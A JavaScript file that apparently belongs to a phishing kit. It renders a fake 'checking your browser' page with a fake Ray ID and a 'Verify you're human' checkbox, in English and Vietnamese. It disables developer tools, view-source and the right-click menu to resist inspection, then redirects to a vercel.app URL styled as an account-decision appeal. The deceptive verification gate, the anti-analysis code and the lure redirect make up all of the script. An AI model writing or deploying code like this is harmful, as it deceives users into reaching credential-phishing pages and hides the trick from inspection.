document.addEventListener('keydown', function (e) {
  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
    e.preventDefault();
  }
});
document.addEventListener('contextmenu', function (e) {
  e.preventDefault();
});

const userLang = navigator.language || navigator.userLanguage;
const langMap = {
  en: {
    title: "www.yoursite.com",
    description: "Checking your browser before accessing...",
    checkbox: "Verify you're human",
    footer: "This site is performing a security check before allowing access."
  },
  vi: {
    title: "www.netcraftsync.sbs",
    description: "Đang kiểm tra bảo mật kết nối của bạn...",
    checkbox: "Xác minh bạn là con người",
    footer: "www.netcraftsync.sbs cần đánh giá tính bảo mật kết nối của bạn trước khi tiếp tục."
  }
};

const lang = userLang.startsWith('vi') ? 'vi' : 'en';
const content = langMap[lang];

document.getElementById('title').textContent = content.title;
document.getElementById('description').textContent = content.description;
document.getElementById('checkbox-text').textContent = content.checkbox;
document.getElementById('footer-text').textContent = content.footer;

function generateRayID() {
  const chars = 'abcdef0123456789';
  let id = '';
  for (let i = 0; i < 16; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}

function redirect() {
  const rayId = generateRayID();
  document.getElementById('ray-id').textContent = rayId;
  setTimeout(() => {
    window.location.href = "https://appealcaseid1390756882.vercel.app/disagree-decision";
  }, 1500);
}

document.getElementById('ray-id').textContent = generateRayID();
setTimeout(() => {
  document.getElementById('spinner').style.display = 'none';
  document.getElementById('checkbox-wrapper').style.display = 'flex';
}, 1000);
